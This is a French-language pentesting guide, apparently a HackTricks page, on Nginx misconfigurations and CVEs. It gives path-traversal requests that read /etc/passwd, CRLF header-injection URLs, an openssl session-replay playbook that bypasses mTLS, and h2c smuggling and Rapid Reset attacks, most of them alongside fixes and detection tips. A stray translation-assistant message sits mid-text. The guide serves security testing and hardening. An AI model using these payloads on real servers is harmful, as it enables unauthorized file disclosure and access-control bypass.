# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Emplacement root manquant <a href="#missing-root-location" id="missing-root-location"></a>

Lors de la configuration du serveur Nginx, la **root directive** joue un rôle critique en définissant le répertoire de base à partir duquel les fichiers sont servis. Considérez l'exemple ci-dessous:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Dans cette configuration, `/etc/nginx` est désigné comme répertoire root. Cette configuration permet l'accès aux fichiers situés dans le répertoire root spécifié, comme `/hello.txt`. Cependant, il est important de noter que seule une location spécifique (`/hello.txt`) est définie. Il n'y a aucune configuration pour la location root (`location / {...}`). Cette omission signifie que la directive root s'applique globalement, permettant aux requêtes vers le chemin racine `/` d'accéder aux fichiers sous `/etc/nginx`.

Une considération de sécurité critique découle de cette configuration. Une simple requête `GET`, par exemple `GET /nginx.conf`, pourrait exposer des informations sensibles en servant le fichier de configuration Nginx situé à `/etc/nginx/nginx.conf`. Définir le root sur un répertoire moins sensible, comme `/etc`, pourrait atténuer ce risque, mais cela peut toujours permettre un accès non voulu à d'autres fichiers critiques, y compris d'autres fichiers de configuration, les access logs, et même des identifiants chiffrés utilisés pour HTTP basic authentication.

## Mauvaise configuration alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Dans les fichiers de configuration de Nginx, il convient d'examiner de près les directives "location". Une vulnérabilité connue sous le nom de Local File Inclusion (LFI) peut être introduite involontairement via une configuration ressemblant à la suivante :
```
location /imgs {
alias /path/images/;
}
```
Cette configuration est vulnérable aux attaques LFI car le serveur interprète des requêtes comme `/imgs../flag.txt` comme une tentative d'accès à des fichiers en dehors du répertoire prévu, résolvant effectivement en `/path/images/../flag.txt`. Cette faille permet aux attaquants de récupérer des fichiers du système de fichiers du serveur qui ne devraient pas être accessibles via le web.

Pour atténuer cette vulnérabilité, la configuration doit être ajustée pour :
```
location /imgs/ {
alias /path/images/;
}
```
Plus d'infos : [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Tests Accunetix :
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restriction de chemin non sécurisée <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consultez la page suivante pour apprendre comment contourner des directives telles que :
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Utilisation non sécurisée des variables / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variables vulnérables `$uri` et `$document_ur`i — cela peut être corrigé en les remplaçant par `$request_uri`.
>
> Une regex peut également être vulnérable, par exemple :
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnérable
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Non vulnérable (vérification des espaces)
>
> `location ~ /docs/(.*)? { … $1 … }` - Non vulnérable

L'exemple ci-dessous illustre une vulnérabilité dans la configuration Nginx :
```
location / {
return 302 https://example.com$uri;
}
```
Les caractères \r (Carriage Return) et \n (Line Feed) signifient des caractères de nouvelle ligne dans les requêtes HTTP, et leurs formes encodées en URL sont représentées par `%0d%0a`. L'inclusion de ces caractères dans une requête (par ex., `http://localhost/%0d%0aDetectify:%20clrf`) vers un serveur mal configuré entraîne que le serveur émet un nouvel en-tête nommé `Detectify`. Cela se produit parce que la variable $uri décode les caractères de nouvelle ligne encodés en URL, conduisant à un en-tête inattendu dans la réponse :
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
En savoir plus sur les risques de CRLF injection et response splitting sur [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Cette technique est également [**expliquée dans cette présentation**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) avec des exemples vulnérables et des mécanismes de détection. Par exemple, pour détecter cette mauvaise configuration depuis une perspective blackbox, vous pouvez effectuer ces requêtes :

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Si vulnérable, la première répondra (car "X" est any HTTP method) et la seconde renverra une erreur car H n'est pas une méthode valide. Ainsi, le serveur recevra quelque chose comme : `GET / H HTTP/1.1` et cela déclenchera l'erreur.

D'autres exemples de détection seraient :

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Quelques configurations vulnérables présentées dans cette conférence étaient :

- Notez comment **`$uri`** est défini tel quel dans l'URL finale
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Remarquez encore comment **`$uri`** est dans l'URL (cette fois à l'intérieur d'un paramètre)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Maintenant sur AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### N'importe quelle variable

Il a été découvert que **des données fournies par l'utilisateur** peuvent, dans certaines circonstances, être interprétées comme une **variable Nginx**. La cause de ce comportement reste quelque peu énigmatique ; ce n'est cependant ni rare ni simple à vérifier. Cette anomalie a été mise en évidence dans un rapport de sécurité sur HackerOne, consultable [here](https://hackerone.com/reports/370094). Une investigation plus approfondie du message d'erreur a permis d'identifier son apparition dans le [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), désignant Server Side Includes (SSI) comme la cause première.

Pour **détecter cette misconfiguration**, la commande suivante peut être exécutée ; elle consiste à définir un referer header pour tester l'affichage des variables :
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Les scans pour cette mauvaise configuration sur plusieurs systèmes ont révélé plusieurs cas où des variables Nginx pouvaient être affichées par un utilisateur. Cependant, la diminution du nombre d'instances vulnérables suggère que les efforts pour corriger ce problème ont été quelque peu efficaces.

### Utiliser try_files avec les variables $URI$ARGS

La mauvaise configuration Nginx suivante peut conduire à une vulnérabilité LFI :
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Dans notre configuration, nous avons la directive `try_files` qui est utilisée pour vérifier l'existence des fichiers dans un ordre spécifié. Nginx servira le premier qu'il trouvera. La syntaxe de base de la directive `try_files` est la suivante :
```
try_files file1 file2 ... fileN fallback;
```
Nginx vérifiera l'existence de chaque fichier dans l'ordre spécifié. Si un fichier existe, il sera servi immédiatement. Si aucun des fichiers spécifiés n'existe, la requête sera transmise à l'option de repli, qui peut être une autre URI ou une page d'erreur spécifique.

Cependant, lorsqu'on utilise les variables `$uri$args` dans cette directive, Nginx tentera de rechercher un fichier correspondant à l'URI de la requête combinée avec les paramètres de la chaîne de requête. Nous pouvons donc exploiter cette configuration :
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Je n'ai pas reçu le payload ni le contenu du fichier. Peux-tu coller ici le payload (ou le contenu de src/network-services-pentesting/pentesting-web/nginx.md) à traduire ? Je le traduirai en français en conservant exactement la même syntaxe Markdown/HTML et les tags/liens/pathes non traduits.
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
En utilisant notre payload nous échapperons au répertoire racine (défini dans la configuration Nginx) et chargerons le fichier `/etc/passwd`. Dans les debug logs nous pouvons observer comment Nginx essaie les fichiers :
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contre Nginx en utilisant la configuration mentionnée ci-dessus :
![Example burp request](../../images/nginx_try_files.png)

## Lecture de la réponse brute du backend

Nginx propose une fonctionnalité via `proxy_pass` qui permet d'intercepter les erreurs et les en-têtes HTTP générés par le backend, afin de masquer les messages d'erreur internes et les en-têtes. Cela se fait en servant des pages d'erreur personnalisées en réponse aux erreurs du backend. Cependant, des problèmes surviennent lorsque Nginx reçoit une requête HTTP invalide. Une telle requête est transmise au backend telle quelle, et la réponse brute du backend est alors directement renvoyée au client sans intervention de Nginx.

Considérons un scénario d'exemple impliquant une application uWSGI :
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Pour gérer cela, des directives spécifiques dans la configuration Nginx sont utilisées :
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors) : Cette directive permet à Nginx de fournir une réponse personnalisée pour les réponses backend ayant un code d'état supérieur à 300. Elle garantit que, pour notre application uWSGI d'exemple, une réponse `500 Error` est interceptée et prise en charge par Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header) : Comme son nom l'indique, cette directive masque certains en-têtes HTTP spécifiés au client, améliorant la confidentialité et la sécurité.

Lorsqu'une requête valide `GET` est effectuée, Nginx la traite normalement, renvoyant une réponse d'erreur standard sans révéler d'en-têtes secrets. Cependant, une requête HTTP invalide contourne ce mécanisme, entraînant l'exposition des réponses brutes du backend, y compris les en-têtes secrets et les messages d'erreur.

## merge_slashes réglé sur off

Par défaut, la directive **`merge_slashes`** de Nginx est réglée sur **`on`**, ce qui compresse plusieurs slashs consécutifs dans une URL en un seul slash. Cette fonctionnalité, tout en simplifiant le traitement des URL, peut involontairement masquer des vulnérabilités dans les applications derrière Nginx, en particulier celles sujettes aux attaques de local file inclusion (LFI). Les experts en sécurité **Danny Robinson et Rotem Bar** ont souligné les risques potentiels associés à ce comportement par défaut, surtout lorsque Nginx agit comme reverse-proxy.

Pour atténuer ces risques, il est recommandé de **désactiver la directive `merge_slashes`** pour les applications susceptibles à ces vulnérabilités. Cela garantit que Nginx transmet les requêtes à l'application sans modifier la structure de l'URL, évitant ainsi de masquer des problèmes de sécurité sous-jacents.

Pour plus d'informations, consultez [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **En-têtes de réponse Maclicious**

Comme montré dans [**this writeup**](https://mizu.re/post/cors-playground), certains en-têtes, s'ils sont présents dans la réponse du serveur web, vont modifier le comportement du proxy Nginx. Vous pouvez les consulter [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect` : Indique à Nginx de rediriger en interne une requête vers un emplacement spécifié.
- `X-Accel-Buffering` : Contrôle si Nginx doit bufferiser la réponse ou non.
- `X-Accel-Charset` : Définit le jeu de caractères pour la réponse lorsque `X-Accel-Redirect` est utilisé.
- `X-Accel-Expires` : Définit le délai d'expiration pour la réponse lorsque `X-Accel-Redirect` est utilisé.
- `X-Accel-Limit-Rate` : Limite le débit de transfert pour les réponses lorsque `X-Accel-Redirect` est utilisé.

Par exemple, l'en-tête **`X-Accel-Redirect`** provoquera une **redirection** interne dans nginx. Ainsi, avoir une configuration nginx contenant par exemple **`root /`** et une réponse du serveur web avec **`X-Accel-Redirect: .env`** fera en sorte que nginx envoie le contenu de **`/.env`** (Path Traversal).

### **Valeur par défaut dans la directive map**

Dans la **configuration Nginx**, la directive `map` joue souvent un rôle dans le **contrôle d'autorisation**. Une erreur courante est de ne pas spécifier une valeur **par défaut**, ce qui peut conduire à un accès non autorisé. Par exemple :
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sans `default`, un **malicious user** peut contourner la sécurité en accédant à une **undefined URI** dans `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) conseille de définir une **valeur par défaut** pour éviter ce genre de problème.

### **DNS Spoofing Vulnerability**

DNS spoofing contre Nginx est possible sous certaines conditions. Si un attaquant connaît le **DNS server** utilisé par Nginx et peut intercepter ses requêtes DNS, il peut falsifier les enregistrements DNS. Cette méthode, toutefois, est inefficace si Nginx est configuré pour utiliser **localhost (127.0.0.1)** pour la résolution DNS. Nginx permet de spécifier un DNS server comme suit :
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` et `internal` Directives**

La directive **`proxy_pass`** est utilisée pour rediriger les requêtes vers d'autres serveurs, soit en interne soit en externe. La directive **`internal`** garantit que certaines locations ne sont accessibles qu'à l'intérieur de Nginx. Bien que ces directives ne soient pas des vulnérabilités en elles‑mêmes, leur configuration nécessite un examen attentif pour éviter des failles de sécurité.

## proxy_set_header Upgrade & Connection

Si le serveur nginx est configuré pour transmettre les en‑têtes Upgrade et Connection, une [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) pourrait être réalisée pour accéder à des endpoints protégés/internes.

> [!CAUTION]
> Cette vulnérabilité permettrait à un attaquant d'**établir une connexion directe avec le `proxy_pass` endpoint** (`http://backend:9999` dans ce cas) dont le contenu ne serait pas vérifié par nginx.

Exemple de configuration vulnérable permettant de voler `/flag` depuis [ici](https://bishopfox.com/blog/h2c-smuggling-request) :
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Notez que même si le `proxy_pass` pointait vers un **chemin** spécifique comme `http://backend:9999/socket.io`, la connexion sera établie avec `http://backend:9999` ; vous pouvez donc **contacter n'importe quel autre chemin à l'intérieur de ce endpoint interne. Il n'importe donc pas si un chemin est spécifié dans l'URL de proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

En 2024 Nginx a publié CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 et CVE-2024-35200 montrant qu'une **seule session QUIC hostile** peut faire planter les processus worker ou leak de mémoire dès que le module expérimental `ngx_http_v3_module` est compilé et qu'un socket `listen ... quic` est exposé. Les builds impactés sont 1.25.0–1.25.5 et 1.26.0, tandis que 1.27.0/1.26.1 intègrent les correctifs ; la memory disclosure (CVE-2024-34161) nécessite en outre des MTU supérieurs à 4096 octets pour faire apparaître des données sensibles (détails dans l'avis nginx 2024 référencé ci-dessous).

**Recon & exploitation hints**

- HTTP/3 est opt-in : scannez les réponses `Alt-Svc: h3=":443"` ou tentez des handshakes QUIC sur UDP/443 en brute-force ; une fois confirmé, fuzzez le handshake et les frames STREAM avec des payloads personnalisés `quiche-client`/`nghttp3` pour déclencher des plantages de worker et forcer la log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Contournement de l'authentification par certificat client via la reprise de session TLS (CVE-2025-23419)

Un avis de février 2025 a révélé que nginx 1.11.4–1.27.3 compilé avec OpenSSL permet de **réutiliser une session TLS 1.3** d'un vhost basé sur le nom dans un autre, de sorte qu'un client ayant négocié un hôte sans certificat peut rejouer le ticket/PSK pour sauter dans un vhost protégé par `ssl_verify_client on;` et contourner complètement le mTLS. Le bug se déclenche dès que plusieurs vhosts partagent le même cache de session TLS 1.3 et les tickets (voir l'avis nginx 2025 référencé ci-dessous).

**Playbook de l'attaquant**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Si la cible est vulnérable, le second handshake se termine sans présenter de certificat client, révélant des emplacements protégés.

**Ce qu'il faut auditer**

- Blocs `server_name` mixtes qui partagent `ssl_session_cache shared:SSL` plus `ssl_session_tickets on;`.
- Blocs Admin/API qui attendent mTLS mais héritent des paramètres partagés de session/cache/ticket depuis des hôtes publics.
- Automatisation qui active la reprise de session TLS 1.3 globalement (p.ex., Ansible roles) sans tenir compte de l'isolation des vhosts.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) still affects nginx when operators crank `keepalive_requests` or `http2_max_concurrent_streams` beyond the defaults: an attacker opens one HTTP/2 connection, floods it with thousands of streams, then immediately issues `RST_STREAM` frames so the concurrency ceiling is never reached while CPU keeps burning on tear-down logic. Nginx defaults (128 concurrent streams, 1000 keepalive requests) keep the blast radius small; pushing those limits "substantially higher" makes it trivial to starve workers even from a single client (see the F5 write-up referenced below).

**Conseils de détection**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Les hôtes qui révèlent des valeurs anormalement élevées pour ces directives sont des cibles de choix : un client HTTP/2 peut boucler sur la création de streams et l'envoi instantané de frames `RST_STREAM` pour garder le CPU saturé sans déclencher le plafond de concurrence.

## Essayez-le vous-même

Detectify a créé un dépôt GitHub où vous pouvez utiliser Docker pour configurer votre propre serveur de test Nginx vulnérable avec certaines des mauvaises configurations abordées dans cet article et essayer de les trouver vous-même !

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Outils d'analyse statique

### [GIXY](https://github.com/yandex/gixy)

Gixy est un outil d'analyse de la configuration Nginx. L'objectif principal de Gixy est de prévenir les mauvaises configurations de sécurité et d'automatiser la détection de failles.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner est un outil simple pour rechercher des mauvaises configurations courantes de Nginx et des vulnérabilités.

## Références

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
